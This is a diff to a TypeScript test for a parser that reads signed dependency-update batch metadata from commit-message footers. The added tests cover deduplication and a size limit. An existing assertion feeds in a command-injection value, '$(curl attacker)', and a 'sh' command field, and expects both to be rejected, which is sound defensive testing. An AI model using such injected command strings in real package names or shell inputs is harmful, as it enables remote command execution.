@@ -14,6 +14,9 @@ test("signed metadata is bounded data; malformed phases, commands and duplicate 
   const footer = (value: any) => `fix(deps): update\n\nNylzo-Batch-V1: ${JSON.stringify(value)}`;
   assert.deepEqual(batches.readBatch(footer(metadata())), metadata());
   assert.equal(batches.readBatch("fix(deps): legacy update"), null);
+  const repeated = batches.readBatch(footer(metadata(Array.from({ length: 150 }, () => items[0]!))));
+  assert.equal(repeated.candidates.length, 1, "One Action repeated across workflow files remains one update target");
+  assert.throws(() => batches.readBatch(footer(metadata(Array.from({ length: 129 }, (_, index) => candidate(`package-${index}`))))));
   for (const value of [{ ...metadata(), phase: "publish" }, { ...metadata(), root: 3 }, { ...metadata(), candidates: [candidate("$(curl attacker)")] }, { ...metadata(), command: "sh" }]) assert.throws(() => batches.readBatch(footer(value)));
   assert.throws(() => batches.readBatch(footer(metadata()) + "\n" + footer(metadata())));
 });
